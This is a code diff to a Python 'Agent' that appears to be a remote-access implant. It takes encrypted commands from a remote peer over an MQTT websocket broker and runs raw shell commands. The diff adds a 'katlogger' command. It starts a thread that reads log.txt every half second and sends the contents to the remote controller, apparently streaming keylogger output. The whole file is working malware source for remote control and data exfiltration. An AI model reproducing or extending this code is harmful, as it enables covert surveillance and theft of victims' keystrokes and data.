@@ -1,5 +1,5 @@
 try:
-    import os, time, json, base64, uuid, subprocess, socket, getpass
+    import os, time, json, base64, uuid, subprocess, socket, getpass, threading
     import paho.mqtt.client as mqtt
     from nacl.public import PrivateKey, PublicKey, Box
     from nacl.encoding import Base64Encoder
@@ -23,6 +23,7 @@ class Agent:
         self.sk = self.load_or_create_keyfile(self.KEYFILE)
         self.pk_b64 = self.sk.public_key.encode(encoder=Base64Encoder).decode()
         self.peers_pub = {}
+        self.logging_active = False
 
     
         self.client = mqtt.Client(client_id=f"agent_{int(time.time())}", transport="websockets")
@@ -75,6 +76,19 @@ class Agent:
             self.safe_send_encrypted(f"out/{sender}", sender_pub,
                                      {"type":"cmd_output","id":cmd_id,"line":line,"stream":"stderr","seq":i})
 
+    def _katlogger_loop(self, sender, sender_pub, cmd_id):
+        while self.logging_active:
+            try:
+                with open("log.txt", "r", encoding="utf-8") as f:
+                    content = f.read()
+                self.safe_send_encrypted(f"out/{sender}", sender_pub,
+                                         {"type":"cmd_output","id":cmd_id,"line":content,"stream":"stdout","seq":0})
+                time.sleep(0.5)
+            except Exception as e:
+                self.safe_send_encrypted(f"out/{sender}", sender_pub,
+                                         {"type":"cmd_output","id":cmd_id,"line":str(e),"stream":"stderr","seq":0})
+                break
+
     def on_message(self, c, u, msg):
         try:
             if msg.topic.startswith("meta/"): return
@@ -87,7 +101,7 @@ class Agent:
             data = json.loads(box.decrypt(base64.b64decode(enc_data)).decode())
             cmd_type = data.get("exec_type")
             cmd_id = data.get("id")
-
+            
             if cmd_type == "raw" and self.ALLOW_RAW_EXEC:
                 cmd_list = data.get("exec") or []
                 cmd_str = " ".join(cmd_list)
@@ -117,6 +131,14 @@ class Agent:
                 self._send_output_lines(self.peers_pub[sender], sender, cmd_id, stdout, stderr)
                 self.safe_send_encrypted(f"out/{sender}", self.peers_pub[sender],
                                          {"type":"cmd_exit","id":cmd_id,"returncode":proc.returncode,"duration":0})
+            if data.get("type") == "control":
+                command = data.get("command")
+                if command == "katlogger":
+                    self.logging_active = True
+                    threading.Thread(target=self._katlogger_loop, args=(sender, self.peers_pub[sender], cmd_id)).start()
+                elif command == "stop katlogger":
+                    self.logging_active = False
+
         except Exception as e:
             exit(1)
 
